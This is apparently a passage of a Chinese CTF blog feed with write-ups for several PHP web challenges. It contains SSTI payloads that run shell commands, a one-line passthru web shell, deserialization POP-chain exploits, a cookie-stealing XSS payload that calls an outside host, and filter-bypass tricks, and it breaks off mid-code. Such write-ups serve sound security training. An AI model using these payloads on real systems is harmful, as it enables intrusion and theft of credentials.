&quot;&#x27;</span> . <span class="hljs-variable">$variable</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125; &#125;<br></code></pre></td></tr></table></figure><p>payload1:（if标签执行PHP命令）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="hljs-keyword">if</span>&#125;<br>&#123;<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="hljs-keyword">if</span>&#125;<br>&#123;<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="hljs-keyword">if</span>&#125;<br>&#123;<span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><p>4.其他payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<span class="hljs-title class_">Smarty_Internal_Write_File</span>::<span class="hljs-title function_ invoke__">writeFile</span>(<span class="hljs-variable">$SCRIPT_NAME</span>,<span class="hljs-string">&quot;&lt;?php passthru(<span class="hljs-subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">clearConfig</span>())&#125;<br></code></pre></td></tr></table></figure><p>twig模板引擎：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.<span class="hljs-title function_ invoke__">registerUndefinedFilterCallback</span>(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP短标签绕过</title>
    <link href="/2022/03/03/PHP%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87/"/>
    <url>/2022/03/03/PHP%E7%9F%AD%E6%A0%87%E7%AD%BE%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="PHP短标签绕过"><a href="#PHP短标签绕过" class="headerlink" title="PHP短标签绕过"></a>PHP短标签绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/flag.php&#x27;</span>;<br><br>    <span class="hljs-variable">$exam</span> = <span class="hljs-string">&#x27;return\&#x27;&#x27;</span>.<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">time</span>()).<span class="hljs-string">&#x27;\&#x27;;&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;            <span class="hljs-comment">//get传入flag</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;./?flag=&#x27;</span>.<span class="hljs-variable">$exam</span>.<span class="hljs-string">&#x27;&quot;&gt;Click here&lt;/a&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) != <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$exam</span>)) &#123;       <span class="hljs-comment">//要求我们传入的flag与exam一样长</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;长度不允许&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/`|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;关键字不允许&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$flag</span>)) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;马老师发生甚么事了&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?flag=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;fla*&#x27;</span>;<span class="hljs-variable">$a</span>&#123;<span class="hljs-number">3</span>&#125;=<span class="hljs-string">&#x27;g&#x27;</span>;<span class="hljs-meta">?&gt;</span><span class="hljs-number">11111111111111111</span>;<span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$$a</span>;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这题的payload利用了php短标签<code>&lt;?=</code>可以替代<code>&lt;?echo</code><br>然后$$a这个利用了php的可变变量。</p><p>{}可以替代[]在数组中</p><? /*程序操作*/ ?> <?=/*函数*/?></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku web21</title>
    <link href="/2022/03/03/Bugku-web21/"/>
    <url>/2022/03/03/Bugku-web21/</url>
    
    <content type="html"><![CDATA[<h3 id="Bugku-web21"><a href="#Bugku-web21" class="headerlink" title="Bugku web21"></a>Bugku web21</h3><p>file_get_contents()函数,这个函数是可以绕过的</p><p>绕过方式有多种：</p><blockquote><p> 使用php:&#x2F;&#x2F;input伪协议绕过<br>    ① 将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input<br>    ② 用post方法传入想要file_get_contents()函数返回的值<br> 用data:&#x2F;&#x2F;伪协议绕过<br>    将url改为：?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码<br>    或者将url改为：?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="/2022/03/03/MRCTF2020-Ezpop/"/>
    <url>/2022/03/03/MRCTF2020-Ezpop/</url>
    
    <content type="html"><![CDATA[<h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//包含var</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//__invoke()  调用函数的方式调用一个对象时的回应方法</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//调用append函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable language_">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Show;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//包含var</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//__invoke()  调用函数的方式调用一个对象时的回应方法</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//调用append函数</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;346&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable language_">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>);<br><span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span>-&gt;str-&gt;p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF 2nd xss之光</title>
    <link href="/2022/03/03/BJDCTF-2nd-xss%E4%B9%8B%E5%85%89/"/>
    <url>/2022/03/03/BJDCTF-2nd-xss%E4%B9%8B%E5%85%89/</url>
    
    <content type="html"><![CDATA[<h3 id="BJDCTF-2nd-xss之光-反序列化之PHP原生类的利用"><a href="#BJDCTF-2nd-xss之光-反序列化之PHP原生类的利用" class="headerlink" title="[BJDCTF 2nd]xss之光 反序列化之PHP原生类的利用"></a>[BJDCTF 2nd]xss之光 反序列化之PHP原生类的利用</h3><p> <a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p><p>dirsearch扫描出.git git泄露 使用githacker 下载源码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yds_is_so_beautiful&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>使用php原生类构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;window.open(&#x27;http://433e8afe-96f0-428b-bdc5-6d12f307beae.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/07/ndbX3sroBh94YT8.png" alt="image-20210307194713585"></p><p>上传后 查看cookie</p><p><img src="https://i.loli.net/2021/03/07/dcfv4D2xzKW1oVl.png" alt="image-20210307194816365"></p><p>urldecode得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WUSTCTF2020 朴实无华</title>
    <link href="/2022/03/03/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/"/>
    <url>/2022/03/03/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
    
    <content type="html"><![CDATA[<h3 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h3><p>2&#x2F;5&#x2F;2021</p><p>多云    正常</p><p>查看robots</p><p><img src="https://i.loli.net/2021/03/02/mwHnXjlqWRd7f8g.png" alt="38849-zze1blddxi.png"></p><p>访问这个文件看到</p><p><img src="https://i.loli.net/2021/03/02/ij2HY59GceuAZFN.png" alt="36209-5d6w0jqns26.png"></p><p>抓包</p><p><img src="https://i.loli.net/2021/03/02/lDBNco2e7QfzXYs.png" alt="66742-rcku15c91f.png"></p><p>访问这个文件 看到源码  使用工具更改编码方式</p><p><img src="https://i.loli.net/2021/03/02/VLwt26jyBNEgPM5.png" alt="87272-agru2h462gp.png"></p><p>代码审计 需要上传三个参数 每个参数要进行绕过<br>level1 上传一个num参数 要大于2020 加一要大于2021<br>如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值</p><p><img src="https://i.loli.net/2021/03/02/Jq2Kanz5yH4sjdV.png" alt="23150-ri8s4xvjqmp.png"><br><img src="https://blog.110022.xyz/usr/uploads/2021/02/1695913210.png" alt="93799-ikesy9f0u8.png"></p><p>当对字符串’1e10’+1可以将字符串类型强行转换成数字类型</p><p>这样第一个函数就能绕过了<br>    num&#x3D;1e10</p><p>第二个函数”}意思是要将上传后的参数值进行md5加密之后在进行二次加密两次加密的结果相等才可以<br>php具有弱类型，&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较<br>转换的规则为，若该字符串以合法的数值开始，则使用该数值，否则其值为0<br>因此，根据这一点，可以遍历出一个字符串，使得进行MD5加密前是’0e’开头的，MD5加密后也是’0e’开头的，这样子，就能保证加密前后的值是相等&#x3D;&#x3D;的了</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>**<span class="hljs-number">41</span>):<br>    i=<span class="hljs-string">&#x27;0e&#x27;</span>+<span class="hljs-built_in">str</span>(i)<br>    md5=hashlib.md5(i.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> md5[:<span class="hljs-number">2</span>]==<span class="hljs-string">&#x27;0e&#x27;</span> <span class="hljs-keyword">and</span> md5[<span class="hljs-number">2</span>:].isdigit():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;md5:&#123;&#125; &#x27;</span>.<span class="hljs-built_in">format</span>(i))<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>{anote icon&#x3D;”Font Awesome图标” href&#x3D;”跳转地址” type&#x3D;”success”}跑出md5:0e215962017</p><p>第三个函数<br>可以命令执行输入ls试试</p><p><img src="https://i.loli.net/2021/03/02/p1YmDrB24FIlNH8.png" alt="81334-i13r42kp1c.png"></p><p>flag可能在<br>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag中</p><p>条件中增加了过滤 不能有空格不能使用cat<br>空格可以使用$IFS$9代替 cat可以使用tail more代替<br><img src="https://i.loli.net/2021/03/02/7MT1hCQa8Hx5DBP.png" alt="73882-02zwy2wj1i5e.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NPUCTF2020 ReadlezPHP</title>
    <link href="/2022/03/03/NPUCTF2020-ReadlezPHP/"/>
    <url>/2022/03/03/NPUCTF2020-ReadlezPHP/</url>
    
    <content type="html"><![CDATA[<h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>2&#x2F;11&#x2F;2021</p><p>晴     今天压岁钱很多啊 开心</p><p><img src="https://i.loli.net/2021/03/02/hCAmOiKkBaJdyFQ.png" alt="89136-lk2mchgkbd.png"><br>查看源码发现 有一个页面 访问看看</p><p><img src="https://i.loli.net/2021/03/02/8M3f7qruZJGzAHS.png" alt="41403-key473wm4kc.png"></p><p>PHP序列化问题 </p><blockquote><p>construct()函数 程序实例化对象时被加载 在这个程序里面是初始化时间<br>destruct()函数中 b(a) 很容易联想到 system(phpinfo()),exec(phpinfo());assert(phpinfo());shell_exec(phpinfo());nl2br(phpinfo());</p></blockquote><p>构造序列化脚本</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span 